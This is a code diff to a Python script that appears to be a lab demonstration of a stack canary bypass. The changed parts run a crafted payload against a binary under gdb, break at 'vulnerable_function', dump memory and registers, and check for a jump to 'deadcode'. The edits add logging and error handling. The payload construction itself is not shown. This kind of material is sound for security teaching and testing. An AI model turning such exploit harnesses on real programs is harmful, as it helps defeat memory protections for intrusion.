@@ -35,40 +35,48 @@ def create_payload(canary, deadcode_address):
 
 def gdb_auto_run(binary_path, payload):
     gdb_commands = """
-set logging enabled on
-set pagination off
-set disable-randomization on
-break vulnerable_function
-commands
-    print 'Memory Layout at Breakpoint:\\n'
-    x/24wx $esp
-    info registers
-end
-run
-printf "Checking for deadcode execution...\\n"
-continue
-printf "Exploit Test Complete\\n"
-"""
+    set logging enabled on
+    set pagination off
+    set disable-randomization on
+    break vulnerable_function
+    commands
+        print 'Memory Layout at Breakpoint:\\n'
+        x/24wx $esp
+        info registers
+    end
+    run
+    printf "Checking for deadcode execution...\\n"
+    continue
+    printf "Exploit Test Complete\\n"
+    """
     gdb_script = "gdb_script.gdb"
     with open(gdb_script, "w") as f:
         f.write(gdb_commands)
 
     gdb_process = subprocess.Popen(['gdb', '-x', gdb_script, binary_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    output, errors = gdb_process.communicate(input=payload)
+    stdout, stderr = gdb_process.communicate(input=payload)
     gdb_process.wait()
-    print("GDB session has completed. Check gdb_script.gdb for details.")
-    print(output.decode())  
-    if errors:
-        print("Errors:", errors.decode())
+    
+    if gdb_process.returncode != 0:
+        print("GDB did not exit cleanly")
+    if stderr:
+        print("Errors from GDB:", stderr.decode())
+    print("Output from GDB:", stdout.decode())
 
 def main():
+    logging.basicConfig(level=logging.DEBUG)
     print("Starting Stack Canary Bypass demonstration...")
     try:
-        canary, buffer_addr, deadcode_addr = analyze_binary(BINARY_PATH)
-        payload = create_payload(canary, deadcode_addr)
-        print(f"Extracted Addresses: Canary at {hex(canary)}, Buffer at {hex(buffer_addr)}, Deadcode at {hex(deadcode_addr)}")
+        canary_address, buffer_address, deadcode_address = analyze_binary(BINARY_PATH)
+        logging.debug(f"Canary Address: {hex(canary_address)}, Buffer Address: {hex(buffer_address)}, Deadcode Address: {hex(deadcode_address)}")
+        payload = create_payload(canary_address, deadcode_address)
+        logging.debug(f"Payload created successfully.")
         gdb_auto_run(BINARY_PATH, payload)
         print("Exploit attempt completed. Check GDB output for details.")
+    except subprocess.CalledProcessError as e:
+        logging.error("Failed to execute subprocess: %s", e)
+    except ValueError as e:
+        logging.error("Value error: %s", e)
     except Exception as e:
         print(f"An error occurred: {e}")
 
